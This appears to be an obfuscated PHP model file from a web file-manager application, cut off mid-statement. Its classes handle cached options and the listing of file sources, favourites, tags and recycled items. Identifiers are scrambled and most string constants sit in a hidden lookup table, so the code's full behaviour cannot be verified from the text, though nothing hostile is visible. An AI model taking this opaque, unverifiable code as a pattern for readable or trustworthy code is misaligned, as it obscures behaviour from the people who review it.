<?php
 goto cÌîŒ‹ÛÔ‡; B§åÎ®÷ãá: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\164\145\x6d\x4f\x70\164\151\x6f\x6e"; public $field = array(); public function listData($×‡™˜¤ = false, $İÇÑ«¡ = "\155\x6f\144\x69\x66\x79\124\x69\x6d\x65", $€ôñ­¢¤ = false) { $‚¸»ÉÇƒ = Model($this->modelType)->get(!1, $this->optionType, !0); $üÏßÎ¾ = array_values($‚¸»ÉÇƒ); if ($üÏßÎ¾ && $üÏßÎ¾[0] && !is_array($üÏßÎ¾[0])) { Model($this->modelType)->cacheRemove($this->optionType); $‚¸»ÉÇƒ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$‚¸»ÉÇƒ) { return $×‡™˜¤ ? null : array(); } if (!$×‡™˜¤) { $‚¸»ÉÇƒ = array_filter(array_values($‚¸»ÉÇƒ)); return array_sort_by($‚¸»ÉÇƒ, $İÇÑ«¡, $€ôñ­¢¤); } return $‚¸»ÉÇƒ[$_SERVER[™¾ÇÙ¯¹][404] . $×‡™˜¤]; } public function insert($§ë¹‰’Ì) { $‡ñ¿÷×š =& $_SERVER[™¾ÇÙ¯¹]; $§ë¹‰’Ì = array_field_key($§ë¹‰’Ì, $this->field); $œ§àÁâ€ = Model($this->modelType)->get($‡ñ¿÷×š[405], $this->optionType . $‡ñ¿÷×š[406]); $œ§àÁâ€ = $œ§àÁâ€ ? $œ§àÁâ€ : 0; $§ë¹‰’Ì[$‡ñ¿÷×š[407]] = ++$œ§àÁâ€; $§ë¹‰’Ì[$‡ñ¿÷×š[200]] = time(); $§ë¹‰’Ì[$‡ñ¿÷×š[85]] = time(); Model($this->modelType)->set($‡ñ¿÷×š[405], $œ§àÁâ€, $this->optionType . $‡ñ¿÷×š[406]); Model($this->modelType)->set($‡ñ¿÷×š[404] . $œ§àÁâ€, $§ë¹‰’Ì, $this->optionType); return $œ§àÁâ€; } public function update($“—ªğ£, $ÇÄâéØ‚) { $ˆ®¼¹úö =& $_SERVER[™¾ÇÙ¯¹]; $ÇÄâéØ‚ = array_field_key($ÇÄâéØ‚, $this->field); $˜ñÑşˆ¯ = $this->listData($“—ªğ£); if (!$˜ñÑşˆ¯ || !$“—ªğ£) { return !1; } $ÇÄâéØ‚ = array_merge($˜ñÑşˆ¯, $ÇÄâéØ‚); $ÇÄâéØ‚[$ˆ®¼¹úö[85]] = time(); return Model($this->modelType)->set($ˆ®¼¹úö[404] . $“—ªğ£, $ÇÄâéØ‚, $this->optionType); } public function remove($‡ğ…¬Öæ) { if (!$‡ğ…¬Öæ) { return !1; } return Model($this->modelType)->remove($_SERVER[™¾ÇÙ¯¹][404] . $‡ğ…¬Öæ, $this->optionType); } public function clear() { $¹ìØ±“÷ =& $_SERVER[™¾ÇÙ¯¹]; Model($this->modelType)->remove($¹ìØ±“÷[405], $this->optionType . $¹ìØ±“÷[406]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($‘´’Â³, $™—¬–ğƒ) { if (!$™—¬–ğƒ) { return !1; } $ôÂàÚŸ› = $this->listData(); $ôÂàÚŸ› = array_to_keyvalue($ôÂàÚŸ›, $‘´’Â³); return isset($ôÂàÚŸ›[$™—¬–ğƒ]) ? $ôÂàÚŸ›[$™—¬–ğƒ] : !1; } public function findByName($‹¸Çš÷Š) { return $this->findByKey($_SERVER[™¾ÇÙ¯¹][32], $‹¸Çš÷Š); } protected function resetData($úÄæ’­) { $‚ü™áŒß =& $_SERVER[™¾ÇÙ¯¹]; $úÄæ’­ = is_array($úÄæ’­) ? $úÄæ’­ : array(); $Ş×Ì“•ç = array(); for ($Âæ–ËØĞ = 0; $Âæ–ËØĞ < count($úÄæ’­); $Âæ–ËØĞ++) { $Ş×Ì“•ç[$‚ü™áŒß[404] . $úÄæ’­[$Âæ–ËØĞ][$‚ü™áŒß[407]]] = $úÄæ’­[$Âæ–ËØĞ]; } return Model($this->modelType)->set($Ş×Ì“•ç, !1, $this->optionType); } private function getAutoName($¬ÅÅ×Ò) { $„ôÅ—ˆ× = array_to_keyvalue($this->listData(), $_SERVER[™¾ÇÙ¯¹][32]); if (!$„ôÅ—ˆ× || !isset($„ôÅ—ˆ×[$¬ÅÅ×Ò])) { return $¬ÅÅ×Ò; } for ($‘¯»ÏÛã = 1; $‘¯»ÏÛã < count($„ôÅ—ˆ×); $‘¯»ÏÛã++) { $´ˆÊ†×÷ = $¬ÅÅ×Ò . "\x28{$‘¯»ÏÛã}\x29"; if (!isset($„ôÅ—ˆ×[$´ˆÊ†×÷])) { return $´ˆÊ†×÷; } } return $´ˆÊ†×÷; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ç•Àİêò = false, $Ìæéªš = '', $Ö–°á±ù = false) { $×äë«úı =& $_SERVER[™¾ÇÙ¯¹]; $Œå³®èĞ = $this->cacheGet($Ìæéªš); $ãĞá¥Âñ = $this->optionDefault($Ìæéªš); $ãĞá¥Âñ = is_array($ãĞá¥Âñ) ? $ãĞá¥Âñ : array(); if (is_array($Œå³®èĞ)) { $Œå³®èĞ = array_merge($ãĞá¥Âñ, $Œå³®èĞ); return $ç•Àİêò ? isset($Œå³®èĞ[$ç•Àİêò]) ? $Œå³®èĞ[$ç•Àİêò] : null : $Œå³®èĞ; } $ùÃ›•›¥ = $this->filterWhere(array($×äë«úı[33] => $Ìæéªš)); $Œå³®èĞ = $this->where($ùÃ›•›¥)->select(); $Œå³®èĞ = array_to_keyvalue($Œå³®èĞ, $×äë«úı[94], $×äë«úı[383]); foreach ($Œå³®èĞ as $Í†’•Â => $ÀŞ‘½Å¤) { if ($Ö–°á±ù || in_array($Í†’•Â, $this->jsonField)) { $Œå³®èĞ[$Í†’•Â] = json_decode($ÀŞ‘½Å¤, !0); } } $this->cacheSet($Ìæéªš, $Œå³®èĞ); $Œå³®èĞ = array_merge($ãĞá¥Âñ, $Œå³®èĞ); return $ç•Àİêò ? $Œå³®èĞ[$ç•Àİêò] : $Œå³®èĞ; } public function set($Ç§ªÄ·ü, $ÎµÕ¹¦ö = false, $Øîä¢Äï = '') { $ğÜª¤ì‘ =& $_SERVER[™¾ÇÙ¯¹]; $this->cacheRemove($Øîä¢Äï); $£³¦§ı« = array(); $áœÃÈış = is_array($Ç§ªÄ·ü) ? $Ç§ªÄ·ü : array($Ç§ªÄ·ü => $ÎµÕ¹¦ö); foreach ($áœÃÈış as $Ì²ìİÍ§ => $°‘õõŞ) { if (is_array($°‘õõŞ)) { $°‘õõŞ = json_encode_force($°‘õõŞ); } $this->checkLength($°‘õõŞ, !1, $this->tableName . $ğÜª¤ì‘[4] . $Ç§ªÄ·ü); $°‘õõŞ = self::textEncode($°‘õõŞ); $áœÃÈış = array($ğÜª¤ì‘[33] => $Øîä¢Äï, $ğÜª¤ì‘[94] => $Ì²ìİÍ§, $ğÜª¤ì‘[383] => $°‘õõŞ); $£³¦§ı«[] = $this->filterWhere($áœÃÈış); } if (!$£³¦§ı«) { return !0; } $íóñş¿ø = $this->cacheKey($ğÜª¤ì‘[408]); CacheLock::lock($íóñş¿ø); $ˆ±Æƒ«‹ = $this->addAll($£³¦§ı«, array(), !0); CacheLock::unlock($íóñş¿ø); return $ˆ±Æƒ«‹; } protected function optionDefault($£¨¹•š = '') { return !1; } public function setDeep($õÓê­İ, $‡÷¹‹Â = false, $ï¢Œûıï = '') { $Á§áœûú = explode($_SERVER[™¾ÇÙ¯¹][10], $õÓê­İ); $ãÉ°Ì·ö = $this->get(); array_set_value($ãÉ°Ì·ö, $õÓê­İ, $‡÷¹‹Â); $this->set($Á§áœûú[0], $ãÉ°Ì·ö[$Á§áœûú[0]], $ï¢Œûıï); } public function remove($ñ÷Á€…, $İÏˆ¬‡— = '') { $Ñ¾Ñ¿ Ø =& $_SERVER[™¾ÇÙ¯¹]; $this->cacheRemove($İÏˆ¬‡—); $–¤Á”ëŞ = $this->filterWhere(array($Ñ¾Ñ¿ Ø[94] => $ñ÷Á€…, $Ñ¾Ñ¿ Ø[33] => $İÏˆ¬‡—)); if (is_null($ñ÷Á€…)) { unset($–¤Á”ëŞ[$Ñ¾Ñ¿ Ø[94]]); } return $this->where($–¤Á”ëŞ)->delete(); } public function cacheSet($ïÉÙŒ, $ã¥ªäÂ— = false) { return Cache::set($this->cacheKey($ïÉÙŒ), $ã¥ªäÂ—); } public function cacheGet($åïïĞî) { return Cache::get($this->cacheKey($åïïĞî)); } public function cacheRemove($Á±‘ïæ‚) { return Cache::remove($this->cacheKey($Á±‘ïæ‚)); } protected function filterWhere($¼ìåãàµ) { return $¼ìåãàµ; } protected function cacheKey($‚‹ê”¾Š) { return $‚‹ê”¾Š; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\165\x72\x63\x65"; protected $tableMeta = array("\164\141\142\x6c\x65\116\141\155\145" => "\x69\157\x5f\x73\157\165\x72\143\x65\137\x6d\145\x74\141", "\x6d\x65\164\141\x46\x69\x65\154\144" => "\x73\x6f\165\x72\x63\145\x49\x44"); protected $dataAuto = array(array("\155\x6f\144\151\146\171\x54\151\x6d\145", "\164\x69\155\145", "\x69\x6e\163\x65\x72\164", "\x66\x75\x6e\143\x74\x69\x6f\x6e"), array("\x63\162\145\141\164\145\x54\x69\x6d\145", "\164\x69\x6d\x65", "\x69\x6e\163\x65\162\x74", "\x66\x75\x6e\143\x74\151\157\x6e"), array("\166\x69\145\167\124\151\x6d\x65", "\x74\151\155\145", "\x69\156\163\145\x72\x74", "\x66\x75\156\x63\x74\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Êóšä¨€) { return $this->listSource(array($_SERVER[™¾ÇÙ¯¹][409] => $Êóšä¨€)); } public function typeName($’éèñØ) { static $ä‚•­ = array(self::TYPE_SYSTEM => "\163\171\163\x74\x65\155", self::TYPE_USER => "\x75\x73\x65\x72", self::TYPE_GROUP => "\147\162\157\x75\160"); return $ä‚•­[$’éèñØ . $_SERVER[™¾ÇÙ¯¹][12]]; } public function sourceListInfo($ÒÁ²¦‹Ã, $Í¶åĞ²‡ = false) { $ıå‰Á‰ =& $_SERVER[™¾ÇÙ¯¹]; $ÒÁ²¦‹Ã = $ÒÁ²¦‹Ã ? $ÒÁ²¦‹Ã : array(); $ÒÁ²¦‹Ã = array_filter(array_unique($ÒÁ²¦‹Ã)); if (!$ÒÁ²¦‹Ã) { return array(); } $à¾„á–Í = $this->where(array($ıå‰Á‰[410] => array($ıå‰Á‰[7], $ÒÁ²¦‹Ã)))->select(); $this->_listDataApply($à¾„á–Í, $Í¶åĞ²‡); return array_to_keyvalue($à¾„á–Í, $ıå‰Á‰[410]); } public function pathInfoFilter(&$ÊÙ¥âí) { $”–˜â›ª =& $_SERVER[™¾ÇÙ¯¹]; static $å—Ë¥· = false; static $ı£Ğ›“Ú = false; static $•–ÇøÑ³ = false; if (!$å—Ë¥·) { $µö ıŠ = $”–˜â›ª[411]; $µö ıŠ .= $”–˜â›ª[412]; $µö ıŠ .= $”–˜â›ª[413]; $”ª™†ÁÌ = $”–˜â›ª[414]; $³Ğ‰Í¢ê = explode($”–˜â›ª[50], $”ª™†ÁÌ); $å—Ë¥· = explode($”–˜â›ª[50], $µö ıŠ); $ı£Ğ›“Ú = array(); foreach ($å—Ë¥· as $ÎûÑÔŠ) { if (in_array($ÎûÑÔŠ, $³Ğ‰Í¢ê)) { continue; } $ı£Ğ›“Ú[] = $ÎûÑÔŠ; } $•–ÇøÑ³ = explode($”–˜â›ª[50], $”–˜â›ª[415]); } foreach ($•–ÇøÑ³ as $Ä¿÷òß„) { if (isset($ÊÙ¥âí[$Ä¿÷òß„])) { $ÊÙ¥âí[$Ä¿÷òß„] = intval($ÊÙ¥âí[$Ä¿÷òß„]); } } $ÊÙ¥âí[$”–˜â›ª[84]] = $”–˜â›ª[416] . $ÊÙ¥âí[$”–˜â›ª[410]] . $”–˜â›ª[417]; $ÊÙ¥âí[$”–˜â›ª[33]] = $ÊÙ¥âí[$”–˜â›ª[418]] == 1 ? $”–˜â›ª[75] : $”–˜â›ª[199]; $ÊÙ¥âí[$”–˜â›ª[419]] = $this->typeName($ÊÙ¥âí[$”–˜â›ª[419]]); if ($ÊÙ¥âí[$”–˜â›ª[418]] != 1) { $ÊÙ¥âí[$”–˜â›ª[174]] = $ÊÙ¥âí[$”–˜â›ª[420]]; unset($ÊÙ¥âí[$”–˜â›ª[420]]); } $ìÉ¿ÌÂè = $å—Ë¥·; if (isset($ÊÙ¥âí[$”–˜â›ª[421]]) && $ÊÙ¥âí[$”–˜â›ª[421]][$”–˜â›ª[422]] == -1) { $ìÉ¿ÌÂè = $ı£Ğ›“Ú; } $ÊÙ¥âí = array_field_key($ÊÙ¥âí, $ìÉ¿ÌÂè); return $ÊÙ¥âí; } public function listUserFav() { $Ç™®À™‡ =& $_SERVER[™¾ÇÙ¯¹]; $ıÛæ¶ö = Model($Ç™®À™‡[423])->listData(); $ï¾èÁ¬± = array_filter_by_field($ıÛæ¶ö, $Ç™®À™‡[33], $Ç™®À™‡[424]); $ï¾èÁ¬± = array_to_keyvalue($ï¾èÁ¬±, $Ç™®À™‡[12], $Ç™®À™‡[84]); if ($ï¾èÁ¬±) { $ıùäÍ°Ã = $this->listSource(array($Ç™®À™‡[425] => array($Ç™®À™‡[426], $ï¾èÁ¬±))); } $ıùäÍ°Ã = array_to_keyvalue($ıùäÍ°Ã[$Ç™®À™‡[378]], $Ç™®À™‡[410]); foreach ($ıÛæ¶ö as &$ïƒ„µ¼) { $ïƒ„µ¼ = array($Ç™®À™‡[427] => $ïƒ„µ¼[$Ç™®À™‡[407]], $Ç™®À™‡[428] => $ïƒ„µ¼[$Ç™®À™‡[32]], $Ç™®À™‡[429] => $ïƒ„µ¼[$Ç™®À™‡[84]], $Ç™®À™‡[430] => $ïƒ„µ¼[$Ç™®À™‡[33]], $Ç™®À™‡[431] => $ïƒ„µ¼[$Ç™®À™‡[200]], $Ç™®À™‡[432] => $ïƒ„µ¼[$Ç™®À™‡[85]]); if ($ïƒ„µ¼[$Ç™®À™‡[33]] == $Ç™®À™‡[424] && $ıùäÍ°Ã[$ïƒ„µ¼[$Ç™®À™‡[84]]]) { $ïƒ„µ¼[$Ç™®À™‡[86]] = $ıùäÍ°Ã[$ïƒ„µ¼[$Ç™®À™‡[84]]]; } } unset($ïƒ„µ¼); return $ıÛæ¶ö; } public function listUserTag($ñ¼¨àÚä) { $£…ÊèÓÅ =& $_SERVER[™¾ÇÙ¯¹]; if ($ñ¼¨àÚä && !is_array($ñ¼¨àÚä)) { $ñ¼¨àÚä = array($ñ¼¨àÚä); } $ò§³Ş¥ = Model($£…ÊèÓÅ[433])->listData(); $öÛ’½ = array(); $ªÊ¬Ş³à = array(); foreach ($ò§³Ş¥ as $ÈÚÓù²) { $‡ò¼ÛÇÑ = $ÈÚÓù²[$£…ÊèÓÅ[84]]; if (!$‡ò¼ÛÇÑ) { continue; } if (!isset($ªÊ¬Ş³à[$‡ò¼ÛÇÑ])) { $ªÊ¬Ş³à[$‡ò¼ÛÇÑ] = array(); } $ªÊ¬Ş³à[$‡ò¼ÛÇÑ][] = $ÈÚÓù²[$£…ÊèÓÅ[434]]; $öÛ’½[$ÈÚÓù²[$£…ÊèÓÅ[84]]] = $ÈÚÓù²; } $÷İ¬ç‚· = array(); $±Ñ¡ö· = array(); $ÜËô­’ = array(); foreach ($ªÊ¬Ş³à as $“ğöËê => $°ü“”¤†) { $‘åÁÃÔ€ = !0; if (!$ñ¼¨àÚä) { $÷İ¬ç‚·[] = $“ğöËê; continue; } foreach ($ñ¼¨àÚä as $¥Ç†æë) { if (!in_array($¥Ç†æë, $°ü“”¤†)) { $‘åÁÃÔ€ = !1; break; } } if (!$‘åÁÃÔ€) { continue; } if (!is_numeric($“ğöËê)) { $òä³£ø× = $öÛ’½[$“ğöËê]; $èÙŸ´úÁ = array($£…ÊèÓÅ[32] => $òä³£ø×[$£…ÊèÓÅ[32]], $£…ÊèÓÅ[84] => $òä³£ø×[$£…ÊèÓÅ[84]], $£…ÊèÓÅ[33] => $òä³£ø×[$£…ÊèÓÅ[33]], $£…ÊèÓÅ[86] => array($£…ÊèÓÅ[435] => 1), $£…ÊèÓÅ[201] => !0); if ($òä³£ø×[$£…ÊèÓÅ[33]] == $£…ÊèÓÅ[199]) { $ÜËô­’[] = $èÙŸ´úÁ; } if ($òä³£ø×[$£…ÊèÓÅ[33]] == $£…ÊèÓÅ[75]) { $±Ñ¡ö·[] = $èÙŸ´úÁ; } continue; } $÷İ¬ç‚·[] = $“ğöËê; } if ($÷İ¬ç‚·) { $ÎŒĞ‘Œú = $this->listSource(array($£…ÊèÓÅ[425] => array($£…ÊèÓÅ[426], $÷İ¬ç‚·))); } $ÎŒĞ‘Œú = $ÎŒĞ‘Œú ? $ÎŒĞ‘Œú : array($£…ÊèÓÅ[82] => array(), $£…ÊèÓÅ[83] => array()); $ÎŒĞ‘Œú[$£…ÊèÓÅ[82]] = array_merge($ÎŒĞ‘Œú[$£…ÊèÓÅ[82]], $±Ñ¡ö·); $ÎŒĞ‘Œú[$£…ÊèÓÅ[83]] = array_merge($ÎŒĞ‘Œú[$£…ÊèÓÅ[83]], $ÜËô­’); if (isset($ÎŒĞ‘Œú[$£…ÊèÓÅ[375]]) && count($÷İ¬ç‚·) == $ÎŒĞ‘Œú[$£…ÊèÓÅ[375]][$£…ÊèÓÅ[376]]) { return $ÎŒĞ‘Œú; } $×’äŒ³Š = array(); $‡Ğöœ¹ = array_to_keyvalue($ÎŒĞ‘Œú[$£…ÊèÓÅ[82]], $£…ÊèÓÅ[12], $£…ÊèÓÅ[410]); $±ßÇÆ = array_to_keyvalue($ÎŒĞ‘Œú[$£…ÊèÓÅ[83]], $£…ÊèÓÅ[12], $£…ÊèÓÅ[410]); $‚™íØÂ = array_merge($±ßÇÆ, $‡Ğöœ¹); foreach ($÷İ¬ç‚· as $‡ò¼ÛÇÑ) { if (!in_array($‡ò¼ÛÇÑ, $‚™íØÂ)) { $×’äŒ³Š[] = $‡ò¼ÛÇÑ; } } if ($×’äŒ³Š) { Model($£…ÊèÓÅ[436])->removeBySource($×’äŒ³Š); } return $ÎŒĞ‘Œú; } public function listUserRecycle() { $òš¯Ô—Ô =& $_SERVER[™¾ÇÙ¯¹]; $Ì˜­ëÀº = Model($òš¯Ô—Ô[437])->listData(); if (!$Ì˜­ëÀº) { return array(); } $ÃâºÄ‘Ë = array($òš¯Ô—Ô[425] => array($òš¯Ô—Ô[426], $Ì˜­ëÀº), $òš¯Ô—Ô[438] => 1); return $this->listSource($ÃâºÄ‘Ë); } public function listSource($÷Ş®ë¾, $ùÅ½§â´ = 3000, $œã¼®éÜ = false) { $³¸ôéíê =& $_SERVER[™¾ÇÙ¯¹]; if (!isset($÷Ş®ë¾[$³¸ôéíê[439]])) { $÷Ş®ë¾[$³¸ôéíê[439]] = 0; } if (isset($÷Ş®ë¾[$³¸ôéíê[440]]) && $÷Ş®ë¾[$³¸ôéíê[440]] == $³¸ôéíê[197]) { $÷Ş®ë¾[$³¸ôéíê[420]] = array($³¸ôéíê[340], $³¸ôéíê[441]); } $°‘Šáô” = $³¸ôéíê[442]; $€ÓÚİú = $this->field($°‘Šáô”)->_makeOrder()->where($÷Ş®ë¾)->selectPage($ùÅ½§â´); $this->_listPageCheck($€ÓÚİú, $°‘Šáô”, $÷Ş®ë¾); $this->_listDataApply($€ÓÚİú[$³¸ôéíê[378]], $œã¼®éÜ); $this->_listMake($€ÓÚİú); return $€ÓÚİú; } private function _listPageCheck(&$½Ö¼Ğ©¹, $…Œ­œ‘–, $ôáÒåœ¢) { $š¦ª±¼ =& $_SERVER[™¾ÇÙ¯¹]; if (!is_array($½Ö¼Ğ©¹[$š¦ª±¼[375]])) { return; } $Î½êæñ = $½Ö¼Ğ©¹[$š¦ª±¼[375]]; if ($Î½êæñ[$š¦ª±¼[377]] <= 1) { return; } if ($Î½êæñ[$š¦ª±¼[376]] >= 100000) { return; } if (Model($š¦ª±¼[443])->get($š¦ª±¼[444]) != $š¦ª±¼[445]) { return; } $…Œ­œ‘– = str_replace(array($š¦ª±¼[53], $š¦ª±¼[351], $š¦ª±¼[231]), $š¦ª±¼[12], $…Œ­œ‘–); $…Œ­œ‘– = $š¦ª±¼[446] . str_replace($š¦ª±¼[50], $š¦ª±¼[447], $…Œ­œ‘–) . $š¦ª±¼[448]; $†è•ïšÊ = $š¦ª±¼[449]; $†è•ïšÊ = $†è•ïšÊ . $š¦ª±¼[450]; $Å¤Œ¨ØĞ = $Î½êæñ[$š¦ª±¼[372]] * ($Î½êæñ[$š¦ª±¼[362]] - 1) . $š¦ª±¼[50] . $Î½êæñ[$š¦ª±¼[372]]; $ÌÆ¯áª‚ = $this->_makeOrder(!0); $Ãû®¬Æ˜ = $š¦ª±¼[446] . str_replace($š¦ª±¼[50], $š¦ª±¼[447], $ÌÆ¯áª‚[0]); if (strpos($Ãû®¬Æ˜, $š¦ª±¼[451])) { $Ãû®¬Æ˜ = str_replace($š¦ª±¼[451], $š¦ª±¼[452], $Ãû®¬Æ˜); } else { $Ãû®¬Æ˜ .= $š¦ª±¼[453] . $ÌÆ¯áª‚[1]; } $Ó‹Ô––ı = array(); foreach ($ôáÒåœ¢ as $ùÀ¸ÜÇ => $Ç¶†ëşà) { $Ó‹Ô––ı[$š¦ª±¼[446] . $ùÀ¸ÜÇ] = $Ç¶†ëşà; } $this->alias($š¦ª±¼[454])->field($…Œ­œ‘–)->limit($Å¤Œ¨ØĞ)->order($Ãû®¬Æ˜); $°«»Ù‚Ñ = $this->join($†è•ïšÊ)->where($Ó‹Ô––ı)->select(); if ($°«»Ù‚Ñ) { $½Ö¼Ğ©¹[$š¦ª±¼[378]] = $°«»Ù‚Ñ; } } protected function _makeOrder($Éï˜’Ëç = false) { $Ç†°Ï— =& $_SERVER[™¾ÇÙ¯¹]; $õÉãá²Ô = Model($Ç†°Ï—[455])->get($Ç†°Ï—[456]); $ºÎ´†¿â = Model($Ç†°Ï—[455])->get($Ç†°Ï—[457]); $á”·Çõ  = array($Ç†°Ï—[458] => $Ç†°Ï—[459], $Ç†°Ï—[460] => $Ç†°Ï—[461]); $‹¹¹ï = array($Ç†°Ï—[32] => $Ç†°Ï—[32], $Ç†°Ï—[76] => $Ç†°Ï—[76], $Ç†°Ï—[174] => $Ç†°Ï—[420], $Ç†°Ï—[462] => $Ç†°Ï—[462], $Ç†°Ï—[463] => $Ç†°Ï—[464], $Ç†°Ï—[200] => $Ç†°Ï—[200], $Ç†°Ï—[85] => $Ç†°Ï—[85]); $ÙÛéª¨Û = Input::get($Ç†°Ï—[465], $Ç†°Ï—[7], $õÉãá²Ô, array_keys($‹¹¹ï)); $ƒ—¸›½ = Input::get($Ç†°Ï—[466], $Ç†°Ï—[7], $ºÎ´†¿â, array_keys($á”·Çõ )); if (!in_array($ÙÛéª¨Û, array_keys($‹¹¹ï))) { $ÙÛéª¨Û = $Ç†°Ï—[32]; } if (!in_array($ƒ—¸›½, array_keys($á”·Çõ ))) { $ÙÛéª¨Û = $Ç†°Ï—[458]; } if ($ÙÛéª¨Û == $Ç†°Ï—[32]) { } $‚ôŞÄ“­ = $Ç†°Ï—[467] . $‹¹¹ï[$ÙÛéª¨Û] . $Ç†°Ï—[53] . $á”·Çõ [$ƒ—¸›½]; $‚ôŞÄ“­ = rtrim(trim($‚ôŞÄ“­), $Ç†°Ï—[50]); if ($Éï˜’Ëç) { return array($‚ôŞÄ“­, $á”·Çõ [$ƒ—¸›½]); } return $this->order($‚ôŞÄ“­); } protected function _listDataApplyItem($‘«‹ÂÏã, $õĞÊü = false) { $Ÿâ±·ïï = array($‘«‹ÂÏã); $this->_listDataApply($Ÿâ±·ïï, $õĞÊü); return $Ÿâ±·ïï[0]; } protected function _listDataApply(&$›õüËô”, $äü¸ò = false) { $”“ËşÚµ =& $_SERVER[™¾ÇÙ¯¹]; if (!$›õüËô”) { $›õüËô” = array(); return; } $Åø˜»Ê = array_to_keyvalue($›õüËô”, $”“ËşÚµ[12], $”“ËşÚµ[410]); $Åø˜»Ê = array_unique($Åø˜»Ê); $this->_listSourceCache($›õüËô”); if (!$äü¸ò) { $this->_listAppendMeta($›õüËô”, $Åø˜»Ê); $this->_listAppendFileMeta($›õüËô”, $Åø˜»Ê); $this->_listAppendChildren($›õüËô”, $Åø˜»Ê); } $this->_listAppendPath($›õüËô”); $this->_listAppendAuth($›õüËô”); $this->_listAppendSourceInfo($›õüËô”, $Åø˜»Ê); $this->_listAppendUser($›õüËô”); $this->_listFilterInfo($›õüËô”, $äü¸ò); $this->_listAppendAuthSecret($›õüËô”); } protected function _listSourceCache($ÊŠÇİÂ©) { $ÓùÑçä =& $_SERVER[™¾ÇÙ¯¹]; foreach ($ÊŠÇİÂ© as $ªşùüµÌ) { self::$cacheSourceInfo[$ÓùÑçä[468] . $ªşùüµÌ[$ÓùÑçä[410]]] = $ªşùüµÌ; } } protected function _listFilterInfo(&$²à±õô, $óö¶„®¿ = false) { $ù©ã‹Ú =& $_SERVER[™¾ÇÙ¯¹]; foreach ($²à±õô as &$¡ã‰˜Ò­) { $¡ã‰˜Ò­ = $this->pathInfoFilter($¡ã‰˜Ò­); self::$cachePathInfo[$ù©ã‹Ú[469] . intval($óö¶„®¿) . $ù©ã‹Ú[394] . $¡ã‰˜Ò­[$ù©ã‹Ú[410]]] = $¡ã‰˜Ò­; } unset($¡ã‰˜Ò­); } protected function _listMake(&$µ½Öº˜ª) { $ÁÑÇµÀÄ =& $_SERVER[™¾ÇÙ¯¹]; $µ½Öº˜ª[$ÁÑÇµÀÄ[82]] = array(); $µ½Öº˜ª[$ÁÑÇµÀÄ[83]] = array(); foreach ($µ½Öº˜ª[$ÁÑÇµÀÄ[378]] as $Æ’•úğ¹) { $­ûÉ“Í = $Æ’•úğ¹[$ÁÑÇµÀÄ[418]] == 1 ? $ÁÑÇµÀÄ[82] : $ÁÑÇµÀÄ[83]; $µ½Öº˜ª[$­ûÉ“Í][] = $Æ’•úğ¹; } unset($µ½Öº˜ª[$ÁÑÇµÀÄ[378]]); } protected function _listAppendMeta(&$´ßœĞ¶³, $¥µ¦¥­) { $™³¹Êì´ =& $_SERVER[™¾ÇÙ¯¹]; $ı­¼¤ê = array($™³¹Êì´[425] => array($™³¹Êì´[426], $¥µ¦¥­)); $Çš”²€ó = Model($™³¹Êì´[470])->field($™³¹Êì´[471])->where($ı­¼¤ê)->select(); if (!$Çš”²€ó) { return; } $—µ´Æåº = array($™³¹Êì´[472], $™³¹Êì´[473], $™³¹Êì´[452]); $Í …ªî… = array(); foreach ($Çš”²€ó as $µ¢¼­ä) { if (!isset($Í …ªî…[$µ¢¼­ä[$™³¹Êì´[410]]])) { $Í …ªî…[$µ¢¼­ä[$™³¹Êì´[410]]] = array(); } if (in_array($µ¢¼­ä[$™³¹Êì´[94]], $—µ´Æåº)) { continue; } $Í …ªî…[$µ¢¼­ä[$™³¹Êì´[410]]][$µ¢¼­ä[$™³¹Êì´[94]]] = $µ¢¼­ä[$™³¹Êì´[383]]; } foreach ($´ßœĞ¶³ as &$İòÍ—¼Ù) { $İòÍ—¼Ù[$™³¹Êì´[474]] = !1; if (isset($Í …ªî…[$İòÍ—¼Ù[$™³¹Êì´[410]]])) { $İòÍ—¼Ù[$™³¹Êì´[474]] = $Í …ªî…[$İòÍ—¼Ù[$™³¹Êì´[410]]]; } if ($this->fileIsLock($İòÍ—¼Ù) && $İòÍ—¼Ù[$™³¹Êì´[421]]) { $èâ‚†¸ğ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $İòÍ—¼Ù[$™³¹Êì´[421]][$™³¹Êì´[422]] = AuthModel::authDisable($İòÍ—¼Ù[$™³¹Êì´[421]][$™³¹Êì´[422]], $èâ‚†¸ğ); $İòÍ—¼Ù[$™³¹Êì´[421]][$™³¹Êì´[475]][$™³¹Êì´[421]] = $İòÍ—¼Ù[$™³¹Êì´[421]][$™³¹Êì´[422]]; } } unset($İòÍ—¼Ù); } protected function _listAppendFileMeta(&$â‡ëïÑ, $ã°Ñ“Ó³) { $çàÃ¥¬ =& $_SERVER[™¾ÇÙ¯¹]; $Áú¢Ş¦‰ = array_to_keyvalue($â‡ëïÑ, $çàÃ¥¬[12], $çàÃ¥¬[476]); $Áú¢Ş¦‰ = array_filter(array_unique($Áú¢Ş¦‰)); if (!$Áú¢Ş¦‰) { return; } $Ü…ŠÚµå = array($çàÃ¥¬[477] => array($çàÃ¥¬[426], $Áú¢Ş¦‰)); $Ä²èÖ…Ğ = $çàÃ¥¬[478]; $¼Ë¶ı§ß = Model($çàÃ¥¬[479])->field($Ä²èÖ…Ğ)->where($Ü…ŠÚµå)->select(); $¼Ë¶ı§ß = array_to_keyvalue($¼Ë¶ı§ß, $çàÃ¥¬[476]); $¬ÙıúŠÎ = Model($çàÃ¥¬[480])->field($çàÃ¥¬[481])->where($Ü…ŠÚµå)->select(); $¬ÙıúŠÎ = $¬ÙıúŠÎ ? $¬ÙıúŠÎ : array(); $™üÊèóí = array(); foreach ($¬ÙıúŠÎ as $¼‘‚æ…ë) { if (!isset($™üÊèóí[$¼‘‚æ…ë[$çàÃ¥¬[476]]])) { $™üÊèóí[$¼‘‚æ…ë[$çàÃ¥¬[476]]] = array(); } $™üÊèóí[$¼‘‚æ…ë[$çàÃ¥¬[476]]][$¼‘‚æ…ë[$çàÃ¥¬[94]]] = 